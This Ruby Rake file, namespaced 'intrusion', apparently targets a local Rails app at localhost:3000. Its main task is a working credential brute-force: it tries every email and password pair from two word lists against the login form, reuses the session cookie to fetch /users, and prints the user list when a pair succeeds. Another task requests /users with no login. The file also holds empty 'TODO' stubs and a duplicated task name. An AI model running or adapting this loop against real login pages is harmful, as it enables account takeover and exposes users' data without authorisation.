require 'net/http'

namespace :intrusion do
  desc "TODO"
  task get_valid_email: :environment do

  end

  desc "TODO"
  task get_matched_password: :environment do
  end

  desc "TODO"
  task get_matched_password: :environment do
    response = nil
    File.open('emails.txt', 'r') do |f|
      f.each_line do |eline|
        File.open('passwords.txt', 'r') do |p|
          p.each_line do |pline|
            uri = URI('http://localhost:3000/login')
            http = Net::HTTP.new(uri.host, uri.port)
            res = Net::HTTP.post_form(uri, 'session[email]' =>  eline.strip, 'session[password]' => pline.strip )
            #puts res.response['set-cookie']
            uri = URI('http://localhost:3000/users')
            req = Net::HTTP::Get.new(uri)
            req['Cookie'] = res.response['set-cookie']
            response = http.request(req)
            #puts response.code
            if response.code == '200' #'OK'
              puts response.body
              break
            end
          end
        end
        break if response.code == '200'
      end
    end
  end

  desc "TODO"
  task get_users: :environment do
    uri = URI('http://localhost:3000/users')
    res = Net::HTTP.get_response(uri)
    puts res.body
  end
end
